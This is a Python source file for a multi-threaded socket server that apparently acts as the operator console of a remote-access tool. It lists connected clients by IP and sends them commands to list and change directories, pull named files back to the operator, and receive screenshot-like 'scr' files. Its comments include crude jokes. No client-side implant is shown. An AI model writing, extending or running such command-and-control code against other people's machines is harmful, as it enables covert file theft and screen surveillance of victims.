import socket
import sys
import traceback
import glob
from threading import Thread
import threading


Threads_dict={}
block_thread = threading.Condition()
def main():
    start_server()


def start_server():
    host = socket.gethostname()
    #host = '127.0.0.1'
    port = 13337         # arbitrary non-privileged port

    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Socket created")

    try:
        soc.bind((host, port))
    except:
        print("Bind failed. Error : " + str(sys.exc_info()))
        sys.exit()

    max_query=5
    Thread(target=listening_thread, args=(soc, max_query)).start()
    is_active=True
    while is_active:
        with block_thread:
            command = input('enter a command: ')
            print(Threads_dict)
            print(threading.active_count())
            ip = input('which client?')
            if ip in Threads_dict:
                Threads_dict[ip] = command
                block_thread.wait()
    soc.close()


def listening_thread(soc, max_query):
    soc.listen(max_query)       # queue up to 5 requests
    print("Socket now listening\n")
     # infinite loop- do not reset for every requests
    while True:
        connection, address = soc.accept()
        ip, port = str(address[0]), str(address[1])
        print("Connected with " + ip + ":" + port)
        try:
            Threads_dict.update({ip:''})
            Thread(target=client_thread, args=(connection, ip, port), name=ip).start()
            
        except:
            print("Thread did not start.")
            traceback.print_exc()
        

def client_thread(connection, ip, port, max_buffer_size = 5120):
    is_active = True
   
    while is_active:
        if(Threads_dict.get(ip) != ''):
            try:
            #client_input = receive_input(connection, max_buffer_size)
                client_input = Threads_dict.get(ip)
                print('command:' + client_input + ' for ' + ip)
                if "--quit--" in client_input:
                    print("Client is requesting to quit")
                    connection.close()
                    print("Connection " + ip + ":" + port + " closed")
                    is_active = False
                elif("push" in client_input):
                    connection.sendall('ls'.encode('utf-8'))
                    Threads_dict.update({ip:''})
                    print(connection.recv(1024).decode('utf-8'))
                elif("scr" in client_input):
                    with block_thread:
                        connection.sendall('scr'.encode('utf-8'))
                        fname = connection.recv(1024).decode('utf-8')
                        load_scr(fname, connection)
                        block_thread.notify_all()
                elif("ls" in client_input):
                    #здесь надо стопать главный тред а то уебищный вывод
                    with block_thread:
                        connection.sendall('ls'.encode('utf-8'))
                        Threads_dict.update({ip:''})
                        print(connection.recv(1024).decode('utf-8'))
                        block_thread.notify_all()
                elif("cd" in client_input):
                    with block_thread:
                        connection.sendall('cd'.encode('utf-8'))
                        dire = input('Enter dir: ')
                        connection.sendall(dire.encode('utf-8'))
                        Threads_dict.update({ip:''})
                        print(connection.recv(1024).decode('utf-8'))
                        block_thread.notify_all()
                elif("pull" in client_input):
                    with block_thread:
                        connection.sendall('pull'.encode('utf-8'))
                        file_name = input('enter filename: ')
                        connection.sendall(file_name.encode('utf-8'))
                        load_file(file_name ,connection)
                        Threads_dict.update({ip:''})
                        block_thread.notify_all()
                        #is_active = False
            except:
                is_active = False            


def load_scr(fn,c):
    print("Receiving...")
    #l = c.recv(1024)
    f = open(fn,'wb+')
    l = c.recv(1024)
    while (l):
        print("Receiving...")
        f.write(l)
        l = c.recv(1024)
        
    f.close()
    print("Done Receiving")
    #c.send(b'Thank you for sending nudes')
    c.close()

def load_file(fn,c):
    print("Receiving...")
    #l = c.recv(1024)
    f = open(fn,'wb+')
    l = c.recv(1024)
    while (l):
        print("Receiving...")
        f.write(l)
        l = c.recv(1024)
        
    f.close()
    print("Done Receiving")
    #c.send(b'Thank you for sending nudes')
    c.close()

def send_file(fname, c):
    f = open(fname,'rb')
    print('Sending...')
    #c.send(fname.encode('utf-8'))
    l = f.read(1024)
    while (l):
        print('Sending...')
        c.send(l)
        l = f.read(1024)
    f.close()
    c.close()
    #c.shutdown(socket.SHUT_WR)
    print("Done Sending")

def receive_input(connection, max_buffer_size):
    client_input = connection.recv(max_buffer_size)
    if(client_input):
        decoded_input = client_input.decode("utf8")
        return decoded_input
    else:
        return ''



if __name__ == "__main__":
    main()